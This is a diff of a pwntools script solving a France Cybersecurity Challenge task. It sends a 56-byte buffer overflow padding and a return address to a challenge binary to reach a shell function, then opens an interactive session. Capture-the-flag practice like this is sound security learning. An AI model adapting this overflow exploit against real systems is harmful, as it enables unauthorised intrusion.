@@ -1,16 +1,16 @@
+#!/usr/bin/env python3
+
 from pwn import *
-#cyclic, p32, process, raw_input
 
-# io = remote("challenges.france-cybersecurity-challenge.fr", 2050)
+if args.REMOTE:
+    p = remote("challenges.france-cybersecurity-challenge.fr", 2050)
+else:
+    p = process("./pwn")
 
-#pl = cyclic(36)
-# pl += p32(0x004011a2)
-# pl += p32(0x0040205c)
-RIP = p64(0x00402108)
-OFFSET = "A" * 44
+# address of shell : 0x4011a2
+# offset : 56
 
+pay = b"A" * 56 + p64(0x4011a2)
 
-io = process("./pwn")
-#raw_input("attach GDB")
-io.sendline(OFFSET.encode() + RIP)
-print(io.readlineS(False))
+p.sendline(pay)
+p.interactive()
